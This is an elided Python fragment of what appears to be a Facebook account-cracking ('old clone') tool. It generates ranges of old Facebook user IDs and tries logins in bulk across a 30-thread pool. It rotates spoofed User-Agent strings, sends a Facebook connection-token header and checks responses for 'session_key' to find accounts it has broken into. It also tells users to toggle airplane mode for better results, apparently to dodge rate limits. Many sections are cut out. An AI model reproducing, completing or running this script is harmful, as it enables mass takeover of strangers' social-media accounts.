...
def old_clone():
    ...
    """
    ____banner____()
    print(f'       {b}📌A.{c}ALL SERIES{reset}')
    linex()
    print(f'       {b}📌B.{c}100003/4 SERIES{reset}')
    linex()
    print(f'       {b}📌C.{c}2009 series{reset}')
    linex()
...
def old_One():
    ...
    user = []
    ____banner____()
    print(f"       {y}★ {r}Old Code {Y}:{c} 2010-2014{reset}")
    ask = input(f"       {y}★   {r}SELECT {Y}:{c} {reset}")
    linex()
    ____banner____()
    print(f"       {y}★ {r}EXAMPLE {Y}:{c} 20000 / 30000 / 99999{reset}")
    limit = input(f"       {y}★ {r}SELECT {Y}:{c} {reset}")
    linex()
    star = '10000'
    ...
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       {y}★     {c}TOTAL ID FROM CRACK {Y}: {c} {limit}{W}{reset}")
        print(f"       {y}★     {c}USE AIRPLANE MOD FOR GOOD RESULT{c}{reset}")
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
    ...
    "User-Agent": str(random.choice([
        ...
        "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"
            ...
            if 'session_key' in res:
                ...
                st_color = "\033[1;37m" if status == "UREP" else "\033[1;37m"
